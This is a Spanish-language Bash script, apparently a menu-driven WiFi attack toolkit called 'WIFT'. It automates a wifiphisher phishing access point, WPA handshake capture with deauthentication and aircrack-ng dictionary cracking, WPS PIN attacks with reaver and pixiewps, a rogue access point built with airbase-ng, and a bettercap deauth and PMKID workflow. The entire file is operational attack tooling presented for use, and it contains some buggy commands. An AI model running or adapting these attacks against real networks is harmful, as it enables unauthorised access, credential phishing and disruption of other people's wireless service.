#!/bin/bash

echo 
echo

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT
function ctrl_c {
    exit 
}
function limpiar_pantalla {
    clear
}


sleep 2s

echo -e "\e[0;34m\033[1m--------------------------------------------------------------------------"
echo -e "\e[0;34m\033[1m                      __          _______ ______ _______                  " 
echo -e "\e[0;34m\033[1m                      \ \        / /_   _|  ____|__   __|                 "        
echo -e " \e[0;34m\033[1m                      \ \  /\  / /  | | | |__     | |                    "
echo -e " \e[0;34m\033[1m                       \ \/  \/ /   | | |  __|    | |                    "
echo -e " \e[0;34m\033[1m                        \  /\  /   _| |_| |       | |                    "
echo -e "\e[0;34m\033[1m                          \/  \/   |_____|_|       |_|                    "
echo -e "\e[0;34m\033[1m                                   marcoshtb_                             " 
echo -e "\e[0;34m\033[1m--------------------------------------------------------------------------"
echo 
echo

echo -e "\e[0;31m\033[1m"

opciones="Wifi_Phisher Wifi_Cracking Wifi-Reaver Wifi-Access-point WF-Betterc Salir"
        select opcion in $opciones; 
        do
            if [ $opcion = "Wifi_Phisher" ]; then
            echo
            sleep 2s
            limpiar_pantalla
            echo -e "\e[0;34m\033[1m[*]Cargando"
            sleep 2s
            echo -e "\033[0m\e[0mEsta herramienta crea un punto de acceso falso con un phishing para poder obtener la contraseña\n"
            sleep 3s
            limpiar_pantalla
            cd /usr/bin/
            limpiar_pantalla
            read -p "Presiona enter para continuar"
            sleep 2s
            limpiar_pantalla
            echo -e "\e[0;34m\033[1m[*]Cargando"
            sleep 2s
            limpiar_pantalla
            ./wifiphisher
            echo -e "\e[0;33m\033[1m[*]Herramienta finalizada"
            limpiar_pantalla
            sleep 2s
            ./WiP.sh
        #Herramienta para hackeo de wifi
        #Esta Herramienta es en autoridad de cripton666
            elif [ $opcion = "Wifi_Cracking" ]; then
            echo -e "\033[0m\e[0m[*]Cargando"
            sleep 2s
            limpiar_pantalla
            echo -e "\e[0;36m\033[1mHola soy Wice vamos a comenzar\n"
            sleep 2s
            limpiar_pantalla
            metodos="Capturar_El_Hancheake Desincriptar_la_contraseña Menu"
            select opcion in $metodos;
            do
            sleep 3s
            limpiar_pantalla
            if [ $opcion = "Capturar_El_Hancheake" ]; then
                sleep 2s
                sudo airmon-ng check kill
                sleep 1s
                limpiar_pantalla
                read -p "Vamos a poner la tarjeta en modo monito, por favor escriba el nombre de su tarjeta: " z
                airmon-ng start $z
                read -p "Debemos matar procesos PID que nos daran problemas (ejemplo 445 768): " Matar
                echo -e "\e[0;35m\033[1m[*]Matando todos los procesos"
                echo
                sudo kill $Matar
                echo
                echo
                echo -e "\e[0;33m\033[1mAhora deves poner este comando en otra terminal para listar las redes disponibles (sudo airodump-ng wlan0mon)"
                echo
                echo
                echo -e "\e[0;34m\033[1mVAMOS A INTERVENIR LA RED"
                read -p "ahora deves poner el canal de la red  :" canal 
                read -p "ahora la mac BSSID de la red  :" mac 
                read -p "Pon un nombre nombre al Documento que tendra la contraseña Encriptada  :" captura
                read -p "Interfas de la red :" interfas
                sudo airodump-ng -c $canal -w $captura --bssid $mac $interfas
                limpiar_pantalla
                sleep 3s

                    elif [ $opcion = "Desincriptar_la_contraseña" ]; then
                            echo "ahora vamos a deautenticar a un usuario para optener hancheake de la contraseña"
                read -p "Mac de BSSID Wifi  :"	wifi	
                read -p "Pone la Mac del Usuario STATION :" usuario
                sudo aireplay-ng -0 20 -a $wifi -c $usuario wlan0mon
                echo
                echo -e "\e[0;34m\033[1mAhora vas a poner la Ruta de donde tienes el Diccionario y la mac de la wifi  :"
                read -p "Ruta del diccionario  :" diccionario 
                read -p "Nombre de la captura de la contraseña  :" face
                sudo aircrack-ng -w $diccionario -b $wifi $face 
                sleep 2s
                limpiar_pantalla
                
                    elif [ $opcion = "Menu" ]; then
                        sleep 3s
                         limpiar_pantalla
                         ./WiP.sh
                        fi 
                    done

                elif [ $opcion = "Wifi-Reaver" ]; then
                    sleep 2s
                    echo -e "\e[0;33m\033[1mHerramienta para ataques a WPS(Pin)"
                    sleep 2s
                    limpiar_pantalla
                    read -p "Vamos a colocar tu tarjeta en modo monitor, por favor escribe el nombre ejem(wlxc83a35c6e735, wlan0): " k 
                    sleep 2s
                    echo -e "\e[0;31m\033[1m[*]Colacando $k es modo monitor\n"
                    sleep 2s
                    limpiar_pantalla
                    sudo airmon-ng start $k
                    sleep 2s      
                    limpiar_pantalla
                    echo -e "\e[0;37m\033[1mEscribe este comando en otra ventana para escanear las redes que tengan activo el WPS (wash -i wlan0mon )"
                    sleep 1s
                    limpiar_pantalla
                    echo -e "\e[0;33m\033[1mEscriba en otra terminal este comando parar listar las redes disponibles (airodump-ng wlan0mon)\n"
                    echo 
                    read -p "Escriba el nombre de la interfaz que esta usando en modo monitor: " l 
                    read -p "Escriba la BSSID del punto acceso (a) atacar: " m
                    read -P "Escribe el canal: " canal
                    sleep 2s
                    limpiar_pantalla
                    sudo ip l s $l up
                    limpiar_pantalla
                    sudo reaver -i $l -vv -c $canal --bssid $m 
                    sleep 2s
                    read -p "Escribe el PKE: " pk 
                    echo
                    read -p "Escribe el PKR: " pr
                    echo 
                    read -p "Escribe el EHASH1: " ehs 
                    echo
                    read -p "Escribe el EHASH2: " ehs2 
                    echo
                    read -p "Escribe el AUTH-KEY: " auth 
                    echo
                    read -p "Escribe el ENOUNCE: " enon 
                    sleep 2s
                    limpiar_pantalla
                    sudo pixiewps -e $pk -r $pr -s $ehs -z $ehs2 -a $auth -n $enon
                    sleep 2s
                    echo
                    echo
                    read -p "Escribe el WPS-PIN: " pi 
                    sleep 2s
                    limpiar_pantalla
                    reaver -i $l -vv -c $canal --b $m --pin=$pi 
                    sleep 2s
                    echo - "\e[0;31m\033[1m[*]Herramienta Finalizada"
                    limpiar_pantalla
                elif [ $opcion = "Wifi-Access-point" ]; then
                    sleep 2s
                    echo -e "\e[0;34m\033[1mCrear Wifi falso con Airbase"
                    sleep 2s
                    limpiar_pantalla
                    read -p "vamos a poner la tarjeta en modo monitor, por favor escribe el nombre: " o 
                    sleep 2s
                    limpiar_pantalla
                    echo -e "\e[0;34m\033[1m[*]Poniendo $o en modo monitor"
                    sleep 2s
                    limpiar_pantalla
                    sudo airmon-ng start $o
                    sleep 2s
                    limpiar_pantalla
                    sleep 2s
                    read -p "Escribe el ESSID de la red ejem(wifi-gratis): " q 
                    sleep 2s
                    read -p "Escriba la interfaz a utilizar: " r 
                    sleep 2s
                    limpiar_pantalla
                    echo -e "\e[0;33m\033[1mSe creara el punto de acceso ahora debes de configurar paso a paso los comandos de iptable.
                    Debes de configurarcon las direcciones que tu desees en otra terminal"
                    sleep 7s
                    limpiar_pantalla
                    airbase-ng -e $q -v $r 
                    ctrl_c
                elif [ $opcion = "WF-Betterc" ]; then
                sleep 2s
                sudo airmon-ng check kill
                limpiar_pantalla
                    echo -e "\e[0;34m\033[1mAtaque a redes wifi WPA-WPA2 con Bettercap"
                    sleep 2s
                    limpiar_pantalla
                        read -p "Escribe el nombre de tu interfaz: " inter 
                        sleep 2s 
                        limpiar_pantalla
                        echo -e "\e[0;31m\033[1m[*]Seleccionando $inter"
                        sleep 2s
                        limpiar_pantalla
                        echo -e "\e[0;33m\033[1mComandos a utilizar
                        events.stream off           (Ignora los procesos que esta ejerciendo la interfaz)
                        wifi.recon on               (Activa las busqueda wifi)
                        wifi.show                   (Muestra las redes wifi disponibles)
                        wifi.recon.channel          (Realiza una escaner con un canal especifico)
                        wifi.deauth                 (Deautentica a los usuarios de una red especificando la mac)
                        wifi.assoc                  (Hace un ataque pmkid especificando la mac ha atacar) 
                        get wifi.handshakes.file    (Nos muestra como se guardo el archivo en la carpeta root)
                        quit                        (Salir)"
                        sudo bettercap --iface $inter
                        sleep 2s
                        limpiar_pantalla
                        echo -e "\e[0;33m\033[1mVamos a copiar la captura a la carpeta bettercap"
                        sleep 1s 
                        limpiar_pantalla
                        read -p "Escribe el nombre de tu directorio o carpetas ejem (home/wice/Desktop): " direc 
                        sleep 2s
                        read -p "Escribe el nombre con el que deseas guardarlo: " gua 
                        sleep 2s
                        limpiar_pantalla
                        cd /root/
                        ls 
                        echo
                        read -p "Escribe el nombre completo del archivo a copiar: " cope 
                        sleep 2s
                        cp $cope /$direc/Wifi-tools/bettercap/$gua
                        sleep 2s
                        limpiar_pantalla
                        $cope /$direc/Wifi-tools/bettercap/
                        limpiar_pantalla
                        echo -e "Vamos a usar aircrack para lograr obtener la contraseña\n"
                        limpiar_pantalla
                        sleep 2s
                        cd /$direc/Wifi-tools/bettercap
                        sleep 2s
                        limpiar_pantalla
                        ls
                        read -p "Escribe el nombre del archivo: " desic 
                        limpiar_pantalla
                        aircrack-ng $desic -w /usr/share/wordlists/fasttrack.txt 
                        sleep 10s           
                        echo -e "\e[0;31m\033[1m[*]Herramienta finalizada\n"
                        sleep 2s
                        limpiar_pantalla
                elif [ $opcion = "Salir" ]; then 
                    sleep 1s
                    ctrl_c
                    echo -e "\e[0;31m\033[1m[*]Saliendo"
                        exit 0
                        
                    fi 
                done